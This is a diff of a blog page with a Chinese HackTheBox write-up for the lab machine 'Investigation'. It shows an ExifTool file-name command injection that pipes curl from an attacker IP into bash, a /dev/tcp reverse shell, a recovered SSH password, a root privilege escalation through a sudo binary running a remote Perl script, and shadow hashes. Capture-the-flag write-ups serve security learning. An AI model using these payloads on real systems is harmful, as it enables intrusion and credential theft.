@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;525  10.10.11.197   端口扫描22和80: 123456789101112131415161718$ nmap -sC -sV -Pn 10.10.11.197Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2023-01-23 12:">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;525  10.10.11.197                                                                                                              端口扫描22和80: 12345678">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Investigation - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2023/01/23/Investigation-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;525  10.10.11.197   端口扫描22和80: 123456789101112131415161718$ nmap -sC -sV -Pn 10.10.11.197Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2023-01-23 12:">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;525  10.10.11.197                                                                                                              端口扫描22和80: 12345678">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023012301.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023012302.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023012302.jpg">
@@ -129,7 +129,7 @@
         
             <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link2"></i>
+                <i class="icon icon-lg icon-link"></i>
                 About
               </a>
             </li>
@@ -219,7 +219,14 @@
 </li>
 <li><h2 id="10-10-11-197"><a href="#10-10-11-197" class="headerlink" title="10.10.11.197"></a>10.10.11.197</h2></li>
 </ul>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023012301.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023012301.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>22和80:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV -Pn 10.10.11.197</span></span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-23 12:58 CST</span><br><span class="line">Nmap scan report for 10.10.11.197</span><br><span class="line">Host is up (0.10s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (conn-refused)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   3072 2f1e6306aa6ebbcc0d19d4152674c6d9 (RSA)</span><br><span class="line">|   256 274520add2faa73a8373d97c79abf30b (ECDSA)</span><br><span class="line">|_  256 4245eb916e21020617b2748bc5834fe0 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Did not follow redirect to http://eforenzics.htb/</span><br><span class="line">Service Info: Host: eforenzics.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 36.10 seconds</span><br></pre></td></tr></table></figure>
 
@@ -227,27 +234,69 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.197 eforenzics.htb</span><br></pre></td></tr></table></figure>
 
 <p>在线数字取证：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023012302.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023012302.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="ExifTool"><a href="#ExifTool" class="headerlink" title="ExifTool"></a>ExifTool</h1><p>正常一张图片测试，发现是12.37的Exiftool，搜索发现相关漏洞：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023012302.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023012302.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <ul>
 <li>Command Injection in Exiftool before 12.38<br><a href="https://gist.github.com/ert-plus/1414276e4cb5d56dd431c2f0429e4429" target="_blank" rel="noopener">https://gist.github.com/ert-plus/1414276e4cb5d56dd431c2f0429e4429</a></li>
 </ul>
 <h2 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h2><p>文件名注入，可以直接复制重命名方便操作：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp miao.jpg "curl 10.10.14.9 |"</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023012304.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023012304.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="reverse-shell"><a href="#reverse-shell" class="headerlink" title="reverse shell"></a>reverse shell</h2><p>有字符限制，可以通过管道得到shell：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo "sh -i &gt;&amp; /dev/tcp/10.10.14.9/4444 0&gt;&amp;1" &gt; index.html</span><br><span class="line">python -m http.server 80</span><br><span class="line"></span><br><span class="line">cp miao.jpg "curl 10.10.14.9 | bash |"</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023012305.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023012305.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="investigation"><a href="#investigation" class="headerlink" title="investigation"></a>investigation</h1><p>/usr/local/investigation目录中发现一个邮件，其中有个附件里面是windows日志文件：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023012306.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023012306.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>可以使用在线网站提取附件：</p>
 <ul>
 <li>Free MSG EML Viewer | Free Online Email Viewer<br><a href="https://www.encryptomatic.com/viewer/" target="_blank" rel="noopener">https://www.encryptomatic.com/viewer/</a></li>
 </ul>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023012307.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023012307.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h2><p>evtx文件，可以直接使用windows分析，也可以用第三方工具,日志文件中得到密码,就是很常见的误操作场景，把密码当用户名输入了，被记录在日志中：</p>
 <ul>
 <li>omerbenamram/evtx: A Fast (and safe) parser for the Windows XML Event Log (EVTX) format<br><a href="https://github.com/omerbenamram/evtx" target="_blank" rel="noopener">https://github.com/omerbenamram/evtx</a></li>
@@ -257,18 +306,46 @@
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>用户名可以通过在www shell中知道是smorton,使用上面得到的密码登录：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh smorton@10.10.11.197</span><br><span class="line">Def@ultf0r3nz!csPa$$</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023012308.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023012308.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="提权信息"><a href="#提权信息" class="headerlink" title="提权信息"></a>提权信息</h1><p>sudo可以发现一个binary文件，尝试运行直接退出：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023012309.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023012309.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>下载下来进行分析:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp smorton@10.10.11.197:/usr/bin/binary .</span><br></pre></td></tr></table></figure>
 
 <h1 id="binary"><a href="#binary" class="headerlink" title="binary"></a>binary</h1><p>反编译查看代码逻辑，发现程序运行argc需要是3，所以需要两个参数，第二个参数可以看作密码，校验通过后，使用curl请求第一个参数的内容，写入到第二个参数作为文件名的文件中，然后以root权限使用perl运行这个文件：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023012310.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023012310.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="提权-amp-root-flag"><a href="#提权-amp-root-flag" class="headerlink" title="提权 &amp; root flag"></a>提权 &amp; root flag</h1><p>任意perl代码：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> root.pl</span></span><br><span class="line">system("chmod u+s /bin/bash");</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> target</span></span><br><span class="line">sudo /usr/bin/binary http://10.10.14.9:7777/root.pl lDnxUysaQn</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023012311.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023012311.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="shadow"><a href="#shadow" class="headerlink" title="shadow"></a>shadow</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root:$6$8KeEz2EYMU05RVyS$W5GGqM4AHw3D1tLul.LJN2BPUhqEdflA.yCQyu7&#x2F;c2PtZmbAn6qevqSaUlFyhPQbgbhFmDB00I3Of7qPep2WP&#x2F;:19233:0:99999:7:::</span><br><span class="line">smorton:$6$b6pcA0sG5CxXFPzY$QW9XnZAa0B9xm0y8PkNRG497k6lae4q.7zozLTXHu3YE5ElW5Q6ithOG5kbuQOMS8leu1WceWJEJ3J6ImcKVS0:19234:0:99999:7:::</span><br></pre></td></tr></table></figure>
 
 
